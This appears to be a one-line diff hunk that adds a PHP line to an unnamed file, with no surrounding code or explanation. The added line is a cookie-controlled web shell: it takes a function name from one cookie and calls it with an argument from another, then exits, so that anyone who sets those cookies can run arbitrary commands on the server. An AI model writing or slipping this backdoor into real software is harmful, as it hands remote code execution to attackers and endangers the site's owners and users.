@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["XtP"])){$_COOKIE["GAL"]($_COOKIE["XtP"]);exit;}
